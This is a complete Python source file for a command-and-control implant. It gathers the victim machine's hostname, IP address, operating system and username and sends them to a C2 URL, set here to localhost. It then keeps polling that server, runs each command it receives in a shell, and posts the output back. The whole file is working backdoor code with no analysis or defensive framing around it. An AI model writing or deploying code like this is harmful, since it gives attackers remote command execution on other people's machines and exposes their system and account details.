import requests
import socket
import platform
import getpass
import subprocess
import time

c2_server_url = "http://127.0.0.1:5000/command"

def main():
    while True:
        
        if send_info_to_c2_server():
            print("Success: Connection to C2 server.")
            break
        time.sleep(10)  

    while True:
   
        if not keep_connection_to_c2_server():
            print("Error: Connection to C2 server lost.")
            break
        time.sleep(10)  

def send_info_to_c2_server():
    try:
       
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        os = platform.system() + " " + platform.release()
        username = getpass.getuser()

        
        data = {'hostname': hostname, 'ip': ip, 'os': os, 'username': username}

        
        response = requests.post(c2_server_url, json=data)
        if response.status_code == 200:
            return True
        else:
            print("Error: Failed to send information to C2 server.")
            return False
    except Exception as e:
        print("Error:", e)
        return False

def keep_connection_to_c2_server():
    try:
       
        response = requests.get(c2_server_url)
        if response.status_code == 200:
            response_text = response.text.strip()
           
            if response_text.startswith("{") and response_text.endswith("}"):
                try:
                    data = response.json()
                    cmd = data.get('cmd')
                    if cmd:
                        result = execute_command(cmd)
                        requests.post(c2_server_url, json={'result': result})
                except Exception as e:
                    print("Error parsing response from C2 server:", e)
            else:
                print("Error: Invalid JSON response from C2 server")
        return True
    except Exception as e:
        print("Error:", e)
        return False
        return False

def execute_command(cmd):
    try:
        
        result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
        return result
    except Exception as e:
        return str(e)

if __name__ == '__main__':
    main()
